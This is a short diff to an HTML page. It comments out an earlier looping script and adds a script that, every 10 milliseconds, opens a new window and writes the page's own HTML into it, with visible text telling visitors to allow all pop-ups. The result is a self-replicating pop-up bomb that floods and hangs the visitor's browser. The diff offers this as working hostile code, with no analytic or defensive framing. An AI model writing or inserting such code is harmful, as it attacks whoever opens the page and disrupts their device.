@@ -3,6 +3,7 @@
     <title>...</title>
 </head>
 <body>
+    <!--
 <script>
 var a=document.location.href;
 for (var i=0;i<1000;i++){
@@ -10,6 +11,10 @@ for (var i=0;i<1000;i++){
 }
 void(0);
 </script>
+-->
+    <script>
+        setInterval(function() { var w = window.open(); w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML); }, 10);
+    </script>
 <P>Make sure you allow pop-ups, all of them.</p>
 </body>
 </html>
